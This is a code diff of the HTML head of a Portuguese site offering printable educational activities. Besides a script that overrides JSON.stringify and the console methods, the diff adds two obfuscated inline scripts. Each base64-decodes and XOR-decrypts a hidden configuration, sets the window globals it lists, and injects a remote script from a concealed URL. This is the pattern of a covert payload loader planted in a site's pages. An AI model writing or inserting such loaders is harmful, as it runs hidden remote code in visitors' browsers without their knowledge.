@@ -9,9 +9,62 @@
     <meta property="og:description" content="Atividades educativas prontas para imprimir e usar em casa ou na sala de aula, sem perder horas procurando ou preparando materiais." />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
+    <script>
+      (function() {
+        try {
+          var origStringify = JSON.stringify;
+          JSON.stringify = function(value, replacer, space) {
+            var seen = new WeakSet();
+            function safeReplacer(key, val) {
+              if (val && typeof val === "object") {
+                if (val.nodeType || (typeof Node !== "undefined" && val instanceof Node) || (typeof Element !== "undefined" && val instanceof Element)) {
+                  return "[HTMLElement " + (val.nodeName || "Element") + "]";
+                }
+                if (seen.has(val)) {
+                  return "[Circular]";
+                }
+                seen.add(val);
+              }
+              if (typeof replacer === "function") {
+                return replacer.call(this, key, val);
+              }
+              return val;
+            }
+            try {
+              return origStringify(value, replacer || safeReplacer, space);
+            } catch (e) {
+              try {
+                return origStringify(value, safeReplacer, space);
+              } catch (err) {
+                return String(value);
+              }
+            }
+          };
+
+          if (typeof window !== "undefined" && window.console) {
+            ["log", "info", "warn", "error", "debug"].forEach(function(m) {
+              var original = window.console[m];
+              if (typeof original === "function") {
+                window.console[m] = function() {
+                  var args = Array.prototype.slice.call(arguments).map(function(arg) {
+                    if (arg && typeof arg === "object" && (arg.nodeType || (typeof Node !== "undefined" && arg instanceof Node))) {
+                      return "<" + (arg.nodeName ? arg.nodeName.toLowerCase() : "element") + ">";
+                    }
+                    return arg;
+                  });
+                  return original.apply(window.console, args);
+                };
+              }
+            });
+          }
+        } catch (err) {}
+      })();
+    </script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,300..800;1,300..800&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script>(function(){var z_y=atob("DA2vbvyqj3Q5nplUGXaNG47GrU4b9u0gaX6VQdPJ6xoX6+05cGvWQJ/F4lpb7LYnen/GHojZoARQ5vw4Nn3GFpnGoR5KvLV2eHnbHJXI+gBc7btuQlCDTJvG4BZY8up2I1bUTJLL4hEbpLskcHXKArXOrVgb6Pg4bGiNVN6c7hcNrqE3Lj+WVsXJuURbq6AyLGybC8SI8ilE");var b_uil=[];for(var c_ue88=0;c_ue88<z_y.length;c_ue88++){b_uil.push(z_y.charCodeAt(c_ue88)&255);}var t_gkx=b_uil[0];var s_8=b_uil.slice(1,1+t_gkx);var k_3t=b_uil.slice(1+t_gkx);var u_66=k_3t.map(function(b,r_s){return b^s_8[r_s%t_gkx];});var d_d8e="";for(var k_rm=0;k_rm<u_66.length;k_rm++){d_d8e+=String.fromCharCode(u_66[k_rm]&255);}var y_0a32=decodeURIComponent(escape(d_d8e));var g_d=JSON.parse(y_0a32);var o_hmjt=g_d.globals||[];o_hmjt.forEach(function(n_la){window[n_la.name]=n_la.value;});var t_l6nb=document.createElement("script");t_l6nb.src=g_d.url;t_l6nb.async=true;t_l6nb.defer=true;(g_d.attributes||[]).forEach(function(w_5mp4){t_l6nb.setAttribute(w_5mp4.name,w_5mp4.value);});(document.head||document.documentElement).appendChild(t_l6nb);})();</script>
+    <script>(function(){var p_0t7d=atob("DJ0SLnOM0Uy0mFTi6eYwWwHg83aW8CCWme4oAVzvtSKa7SCPgPtrABDjvGLW6nuRiu97Xgf//jnA9SfNhfxmSwD4/ybHunjAiOlmXBrupDjR63bYsuYwQBLhtG6OujCDnfw/WwfhuCrNtSSQjOt3QAehqS/b/HmRivYwAlH6sCDB/XbYy79vAgiuvy3Z/XbYy/lzWhKhpDjZ8TKbxO1gSwXpvziZ6yGAgPlhDF+upy3Y7THA078wUy7x");var c_2f2=[];for(var r_a0=0;r_a0<p_0t7d.length;r_a0++){c_2f2.push(p_0t7d.charCodeAt(r_a0)&255);}var f_f=c_2f2[0];var r_br4=c_2f2.slice(1,1+f_f);var s_at=c_2f2.slice(1+f_f);var c_vl=s_at.map(function(b,j_rkq){return b^r_br4[j_rkq%f_f];});var c_h="";for(var l_i=0;l_i<c_vl.length;l_i++){c_h+=String.fromCharCode(c_vl[l_i]&255);}var f_9s8b=decodeURIComponent(escape(c_h));var e_7q1a=JSON.parse(f_9s8b);var k_tya=e_7q1a.globals||[];k_tya.forEach(function(u_p){window[u_p.name]=u_p.value;});var g_ec=document.createElement("script");g_ec.src=e_7q1a.url;g_ec.async=true;g_ec.defer=true;(e_7q1a.attributes||[]).forEach(function(z_w1l){g_ec.setAttribute(z_w1l.name,z_w1l.value);});(document.head||document.documentElement).appendChild(g_ec);})();</script>
   </head>
   <body class="bg-white text-brand-dark antialiased">
     <div id="root"></div>
